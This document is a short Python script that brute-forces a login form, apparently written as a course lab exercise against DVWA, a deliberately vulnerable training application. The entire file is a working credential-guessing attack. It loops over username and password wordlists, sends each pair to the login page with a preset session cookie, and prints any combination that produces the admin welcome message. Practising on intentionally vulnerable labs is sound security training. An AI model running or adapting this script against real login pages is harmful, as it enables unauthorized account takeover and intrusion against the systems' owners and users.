from bs4 import BeautifulSoup
import requests
import time
import re

with open("small-password.txt") as pfile:
    passwords = pfile.readlines()

with open("small-usernames.txt") as ufile:
    users = ufile.readlines()

cookies_jar = requests.cookies.RequestsCookieJar()
cookies_jar.set('PHPSESSID', 'enter')
cookies_jar.set('security', 'low')

url = 'http://server/DVWA/vulnerabilities/brute/#'


def brute_force():
    for username in users:
        username = username.replace('\r', '').replace('\n', '')
        for password in passwords:
            page_html = try_auth(username,password)
            print("[-]trying %s: %s: %s" % (url, username, password))
            if check_result(page_html):
                print("[+]SUCCESS - username/password worked %s:%s" % (username, password))
                return
            time.sleep(3)


def try_auth(username, password):
    password = password.replace('\r', '').replace('\n', '')
    params = {'username': username, 'password': password, 'Login': 'Login'}
    r = requests.get(url, params, auth=('itp270', 'itp270'), cookies=cookies_jar, )
    parse_html = BeautifulSoup(r.text, 'html.parser')
    result = parse_html.find('div', {'class': 'vulnerable_code_area'})
    return result


def check_result(page_html):
    if re.findall(r'.*Welcome to the password protected area admin.*', str(page_html)):
        return True
    return False


if __name__ == "__main__":
    brute_force()
